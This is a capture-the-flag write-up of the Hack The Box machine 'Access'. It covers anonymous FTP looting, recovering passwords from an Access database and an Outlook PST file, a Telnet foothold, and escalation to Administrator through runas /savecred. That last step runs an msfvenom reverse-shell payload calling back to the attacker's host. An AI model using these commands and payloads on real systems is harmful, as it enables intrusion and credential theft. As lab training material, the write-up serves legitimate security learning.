+++
title = "Access"
date = "2023-12-25"
description = "This is an easy Windows box."
[extra]
cover = "cover.png"
toc = true
+++

# Information

**Difficulty**: Easy

**OS**: Windows

**Release date**: 2018-09-29

**Created by**: [egre55](https://app.hackthebox.com/users/1190)

# Setup

I'll attack this box from a Kali Linux VM as the `root` user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with `sudo`, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!

I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:

1. I'll create a directory that will contain every file related to this box. I'll call it `workspace`, and it will be located at the root of my filesystem `/`.

1. I'll create a `server` directory in `/workspace`. Then, I'll run `httpsimpleserver` to create an HTTP server and `impacket-smbserver` to create an SMB share named `server`. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!

1. I'll place all my tools and binaries into the `/workspace/server` directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.

I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.

Throughout this write-up, my machine's IP address will be `10.10.14.4`, while the target machine's IP address will be `10.10.10.98`. The commands ran on my machine will be prefixed with `❯` for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the `/tmp` or `C:\tmp` folder to clean up more easily later on.

Now we should be ready to go!

# Remote enumeration

## Host discovery

Well, we already know the IP we are targeting, so this phase is actually empty!

## TCP port scanning

As usual, I'll initiate a port scan on Access using a TCP SYN `nmap` scan to assess its attack surface.

```sh
❯ nmap -sS 10.10.10.98 -p-
```

```
<SNIP>
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http
<SNIP>
```

## Service fingerprinting

Following the port scan, let's gather more data about the services associated with the open ports we found.

```sh
❯ nmap -sS 10.10.10.98 -p 21,23,80 -sV
```

```
<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

Alright, so `nmap` managed to determine that Access is running Windows. That's good to know!

## Scripts

Let's run `nmap`'s default scripts on these services to see if they can find additional information.

```sh
❯ nmap -sS 10.10.10.98 -p 21,23,80 -sC
```

```
<SNIP>
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet
80/tcp open  http
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
<SNIP>
```

Alright, so `nmap` reports that FTP allows anonymous login. It failed to get a directory listing though, apparently because the data connection couldn't be opened in passive mode.

It also suggests that the HTTP title of the IIS web server is 'MegaCorp'. Hmmm... that's intriguing!

Anyways, let's start with FTP.

## FTP (port `21/tcp`)

### Anonymous login

According to `nmap`'s scans, we should be able to connect anonymously. Let's try it:

```sh
❯ ftp 10.10.10.98
```

```
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

As expected, we successfully connected.

### Exploring the shares

Now let's list the shares we have access to.

```sh
ftp> ls
```

```
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
```

We get the same '425 Cannot open data connection' message, but then our FTP client automatically sent a `PORT` command to switch to active mode. And it worked, so we got a directory listing!

Let's download the content of these directories on our machine to explore them more efficiently.

```sh
❯ wget --ftp-user=anonymous -m ftp://10.10.10.98 -P /workspace/ftp/ -nH --no-passive-ftp
```

Now let's see what these shares contain.

```sh
❯ tree -a /workspace/ftp
```

```
/workspace/ftp
├── .listing
├── Backups
│   ├── .listing
│   └── backup.mdb
└── Engineer
    ├── .listing
    └── Access Control.zip
<SNIP>
```

Both of the FTP shares seem to contain interesting files, so let's focus on `Backups` first. It contains a `backup.mdb` file... What's that?

> A file with the MDB file extension is a Microsoft Access database file that literally stands for Microsoft Database. This is the default database file format used in Access 2003 and earlier, while newer versions use the ACCDB format.
>
> — [Lifewire](https://www.lifewire.com/mdb-file-2621974)

No wonder this box is named Access! This file must be the key to get a foothold.

### Enumerating `backup.mdb`

We can use `mdbtools` on Kali Linux to interact with this file. It's kinda hard to do by hand though, so I wrote a bash script to save some time:

```sh
#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <mdb_file>"
    exit 1
fi

mdb_file="$1"

# Check if the MDB file exists
if [ ! -f "$mdb_file" ]; then
    echo "Error: MDB file not found: $mdb_file"
    exit 1
fi

# Get the list of tables
tables=$(mdb-tables "$mdb_file")

# Check if tables are found
if [ -z "$tables" ]; then
    echo "No tables found in $mdb_file"
    exit 0
fi

# Loop through each table, use mdb-count to check if it's not empty,
# and use mdb-export to display its content if not empty
for table in $tables; do
    count=$(mdb-count "$mdb_file" "$table")
    if [ "$count" -gt 0 ]; then
        echo "Table: $table"
        mdb-export "$mdb_file" "$table"
        echo -e "\n---------------------------------------\n"
    fi
done

exit 0
```

I'll save it as `access_enumerator.sh`, I'll change its permissions, and I'll run it.

```sh
❯ /workspace/access_enumerator.sh /workspace/ftp/Backups/backup.mdb
```

```
<SNIP>

---------------------------------------

Table: auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,

---------------------------------------

<SNIP>
```

That's a lot of output!

The `auth_user` table content looks really interesting to me. It contains three potential credentials!

I tried them with Telnet, but they didn't work. However, the `engineer`:`access4u@security` returned a 'Access Denied: Specified user is not a member of TelnetClients group' message, so we can assume that this user does exist.

### Exploring the shares

Earlier, we noticed that the `Engineer` folder was comprised of a `Access Control.zip` file. Let's get its content:

```sh
❯ unzip -l "/workspace/ftp/Engineer/Access Control.zip"
```

```
Archive:  /workspace/ftp/Engineer/Access Control.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   271360  2018-08-24 01:13   Access Control.pst
---------                     -------
   271360                     1 file
```

Okay, so it contains a `Access Control.pst` file. Let's unzip it now:

```sh
❯ unzip "/workspace/ftp/Engineer/Access Control.zip" -d "/workspace/"
```

```
Archive:  /workspace/ftp/Engineer/Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

It doesn't work. Let's try a different tool:

```sh
❯ 7z x "/workspace/ftp/Engineer/Access Control.zip" -o"/workspace/"
```

```
<SNIP>

Extracting archive: /workspace/ftp/Engineer/Access Control.zip
--
Path = /workspace/ftp/Engineer/Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
```

We're asked to enter a password. Let's try the one for `engineer`.

```
Everything is Ok         

Size:       271360
Compressed: 10870
```

It worked!

Now we have a `Access Control.pst` file in `/workspace`. It's really cool but... what is it used for?

> A file with the .PST file extension is an Outlook Personal Information Store file that stores personal information used in Microsoft Outlook or Microsoft Exchange. They might include messages, contacts, attachments, addresses, and more.
>
> — [Lifewire](https://www.lifewire.com/pst-file-4140356)

Alright! Looks like we have no enumerate another file.

### Enumerating `Access Control.pst`

Once again, there's a CLI tool we can use on Kali Linux to open `.pst` files. This time, it's named `readpst`. Luckily, it's easier to use than `mdbtools`, no need to write a script here!

```sh
❯ readpst -D -M -b -o /workspace/ "/workspace/Access Control.pst"
```

```
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

Now we have a `Access Control` folder in `/workspace` containing a text file. Let's get its content:

```sh
❯ cat "/workspace/Access Control/2"
```

```
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000

<SNIP>

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John

<SNIP>
```

There's a lot of garbage, but we can clearly see a message from `john@megacorp.com` to `security@accesscontrolsystems.com`. Apparently, the password for the `security` account has been changed to `4Cc3ssC0ntr0ller`!

### Known CVEs

Just for good measure, let's check if FTP is vulnerable to known exploits.

```sh
❯ nmap -sS 10.10.10.98 -p 21 --script vuln
```

```
<SNIP>
PORT   STATE SERVICE
21/tcp open  ftp
<SNIP>
```

Nothing!

# Foothold (Telnet)

Let's try the credentials we found to connect to Access over Telnet.

```sh
❯ telnet 10.10.10.98
```

```
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

They worked!

The shell is limited though, so I tried to use `msfvenom` to get a Windows reverse shell. Unfortunately, the binary to get it has been blocked by a group policy.

# Local enumeration

If we run `whoami`, we see that we got a foothold as `access\security`.

## Version

Let's gather some information about the Windows version of Access.

```cmd
C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    ProductName    REG_SZ    Windows Server 2008 R2 Standard
```

Okay, so this is Windows Server 2008!

```cmd
C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    CurrentBuildNumber    REG_SZ    7600
```

And this is build `7600`.

This version of Windows is a bit old, and maybe there are missing hotfixes. We'll check that later, if we can't find another way to get `NT AUTHORITY\SYSTEM`.

## Architecture

What is Access's architecture?

```cmd
C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
```

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
    PROCESSOR_ARCHITECTURE    REG_SZ    AMD64
```

So this system is using x64. This will be useful to know if we want to compile our own exploits.

## Windows Defender

Let's check if Windows Defender is enabled.

```cmd
C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender
    ProductStatus    REG_DWORD    0x0
```

It's disabled! That's great, it will make our life easier.

## AMSI

Let's check if there's any AMSI provider.

```cmd
C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
```

```
ERROR: The system was unable to find the specified registry key or value.
```

No output. Let's assume there's none then!

## Firewall

Let's see which Windows Firewall policies profiles are enabled.

```cmd
C:\Users\security> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
```

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile
    EnableFirewall    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile
    EnableFirewall    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
    EnableFirewall    REG_DWORD    0x1

End of search: 3 match(es) found.
```

Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression too much though: since we alreay managed to obtain a reverse shell, the protections should be really basic.

## NICs

Let's gather the list of connected NICs.

```cmd
C:\Users\security> ipconfig /all
```

```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACCESS
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-69-64
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::3cdd:9914:8d07:885(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::3cdd:9914:8d07:885%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.98(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{851F7B02-1B91-4636-BB2A-AAC45E5735BC}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

Looks like there's a single network.

## Local users

Let's enumerate all local users using `PowerView`.

```cmd
C:\Users\security> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table"
```

```
GroupName MemberName           SID
--------- ----------           ---
Users     ACCESS\Administrator S-1-5-21-953262931-566350628-63446256-500
Users     ACCESS\security      S-1-5-21-953262931-566350628-63446256-1001
Users     ACCESS\engineer      S-1-5-21-953262931-566350628-63446256-1002
```

So apart from us, there's also `engineer` (as we discovered while trying to connect over Telnet) and `Administrator`.

## Local groups

Let's enumerate all local groups, once again using `PowerView`.

powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; vain | Select-Object GroupName, Comment | Format-Table | Out-String -Width 200"

```cmd
C:\Users\security> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096"
```

```
GroupName                      Comment                           
---------                      -------                           
Administrators                 Administrators have complete and unrestricted access to the computer/domain
Backup Operators               Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Certificate Service DCOM Access Members of this group are allowed to connect to Certification Authorities in the enterprise
Cryptographic Operators        Members are authorized to perform cryptographic operations.
Distributed COM Users          Members are allowed to launch, activate and use Distributed COM objects on this machine.
Event Log Readers              Members of this group can read event logs from local machine
Guests                         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
IIS_IUSRS                      Built-in group used by Internet Information Services.
Network Configuration Operators Members in this group can have some administrative privileges to manage configuration of networking features
Performance Log Users          Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Performance Monitor Users      Members of this group can access performance counter data locally and remotely
Power Users                    Power Users are included for backwards compatibility and possess limited administrative powers
Print Operators                Members can administer domain printers
Remote Desktop Users           Members in this group are granted the right to logon remotely
Replicator                     Supports file replication in a domain
Users                          Users are prevented from making accidental or intentional system-wide changes and can run most applications
TelnetClients
```

Looks classic.

## User account information

Let's gather more information about us.

```cmd
C:\Users\security> net user security
```

```
User name                    security
Full Name                    security
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2018 9:14:57 PM
Password expires             Never
Password changeable          8/22/2018 9:14:57 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile 
Home directory
Last logon                   12/25/2023 12:37:29 PM

Logon hours allowed          All

Local Group Memberships      *TelnetClients        *Users
Global Group memberships     *None
<SNIP>
```

We don't belong to interesting groups.

## Home folder

If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.

```cmd
C:\Users\security> type C:\Users\security\Desktop\user.txt
```

```
97b894cf76e905009037bd3a086fc2c3
```

There's also a strange `.yawcam` folder... Let's see what it contains.

```cmd
C:\Users\security> dir C:\Users\security\.yawcam /a
```

```
<SNIP>
 Directory of C:\Users\security\.yawcam

08/24/2018  07:37 PM    <DIR>          .
08/24/2018  07:37 PM    <DIR>          ..
08/23/2018  10:52 PM    <DIR>          2
08/22/2018  06:49 AM                 0 banlist.dat
08/23/2018  10:52 PM    <DIR>          extravars
08/22/2018  06:49 AM    <DIR>          img
08/23/2018  10:52 PM    <DIR>          logs
08/22/2018  06:49 AM    <DIR>          motion
08/22/2018  06:49 AM                 0 pass.dat
08/23/2018  10:52 PM    <DIR>          stream
08/23/2018  10:52 PM    <DIR>          tmp
08/23/2018  10:34 PM                82 ver.dat
08/23/2018  10:52 PM    <DIR>          www
08/24/2018  07:37 PM             1,411 yawcam_settings.xml
               4 File(s)          1,493 bytes
              10 Dir(s)   3,350,564,864 bytes free
```

It looks like a folder for a software. Let's search online for this.

> Yawcam is short for Yet Another WebCAM software, and that's exactly what it is ;-)
>
> More precise Yawcam is a webcam software for Windows written in Java. The main ideas for Yawcam are to keep it simple and easy to use but to include all the usual features.
>
> — [Yawcam](https://yawcam.com/)

That's interesting! Maybe it captured sensitive information... or maybe it's running an old version.

## Yawcam

### Searching for files

I tried to search folders like `img`, `logs` or `motion` for files or images, but I found nothing.

The `ver.dat` file contains interesting information though:

```cmd
C:\Users\security> type C:\Users\security\.yawcam\ver.dat
```

```
0.6.2
http://www.yawcam.com/ver.dat
http://home.bitcom.se/yawcam_files/ver.dat
```

So Yawcam is using version `0.6.2`!

### Known CVEs

If we search [ExploitDB](https://www.exploit-db.com/) for `Yawcam`, we only find [yawcam 0.2.5 - Directory Traversal](https://www.exploit-db.com/exploits/25487). Our version of Yawcam probably isn't effected by it though, and perhaps it's not running as `NT AUTHORITY\SYSTEM`anyways...

---

Back to our enumeration of home folders, we find something interesting in `C:\Users\Public\Desktop`:

```cmd
C:\Users\security> dir C:\Users\Public\Desktop /a
```

```
08/28/2018  06:51 AM    <DIR>          .
08/28/2018  06:51 AM    <DIR>          ..
07/14/2009  04:57 AM               174 desktop.ini
08/22/2018  09:18 PM             1,870 ZKAccess3.5 Security System.lnk
<SNIP>
```

The `ZKAccess3.5 Security System.lnk` is definitely unusual.

## Inspecting `C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk`

`.lnk` files are Windows shortcut files used by the OS to secure quick access to a certain file. We can't really inspect these files using `cmd.exe`, so I'll transfer `ZKAccess3.5 Security System.lnk` to my own machine.

```cmd
C:\Users\security> copy "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk" "\\10.10.14.4\server\ZKAccess3.5 Security System.lnk"
```

Once this is done, I'll use [pyInker](https://github.com/HarmJ0y/pylnker) to inspect it.

```sh
❯ python2 pylnker.py "/workspace/server/ZKAccess3.5 Security System.lnk"
```

```
out:  Lnk File: /workspace/server/ZKAccess3.5 Security System.lnk
Link Flags: HAS SHELLIDLIST | POINTS TO FILE/DIR | NO DESCRIPTION | HAS RELATIVE PATH STRING | HAS WORKING DIRECTORY | HAS CMD LINE ARGS | HAS CUSTOM ICON
File Attributes: ARCHIVE
Create Time:   2009-07-14 01:25:32.986366
Access Time:   2009-07-14 01:25:32.986366
Modified Time: 2009-07-14 03:39:31.417999
Target length: 20480
Icon Index: 0
ShowWnd: SW_NORMAL
HotKey: 0
Target is on local volume
Volume Type: Fixed (Hard Disk)
Volume Serial: 9c45dbf0
Vol Label: 
Base Path: C:\Windows\System32\runas.exe
(App Path:) Remaining Path: 
Relative Path: ..\..\..\Windows\System32\runas.exe
Working Dir: C:\ZKTeco\ZKAccess3.5
Command Line: /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
Icon filename: C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico
```

Okay, so this shortcut file actually executes `/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"`.

There must be credentials stored in the credential manager for the `Administrator` user!

## Credential manager

Let's check the credential manager for currently stored credentials.

```cmd
C:\Users\security> cmdkey /list
```

```
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

There are indeed some for the `Administrator` user!

# Privilege escalation (stored credentials)

On Windows, stored credentials refer to the user authentication information that is stored by the OS. These stored credentials are used to facilitate automatic logins and access to various resources without requiring the user to enter their username and password each time.

We can abuse the stored credentials for the `Administrator` user to execute any command as `Administrator` using the `runas` utility with the `/savecred` option.

## Preparation

Let's use these stored credentials to obtain a reverse shell as `Administrator`. To do so, I'll setup a listener on port `9001` and I'll use `msfvenom` to create an executable:

```sh
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f exe > /workspace/server/revshell.exe
```

Then I'll transfer it to Access.

Now we should be ready to go!

## Exploitation

Time to use this binary to execute our `revshell.exe` executable as `Administrator`!

```cmd
C:\Users\security> runas /user:ACCESS\Administrator /savecred "C:\tmp\revshell.exe"
```

And on our listener...

```
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.98] 49158
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

It caught the reverse shell! If we run `whoami`, we can confirm that we are indeed `ACCESS\Administrator`.

# Local enumeration

## Home folder

The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it on our Desktop!

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

```
1d389b23d004c0b9b8414aef3445a456
```

# Afterwords

![Success](success.png)

That's it for this box! I found the foothold fairly easy to obtain, it just required a bit of research to properly open the files we found. The privilege escalation was also kinda easy, identifying it required a thorough enumeration, and exploiting it was simple.

Thanks for reading!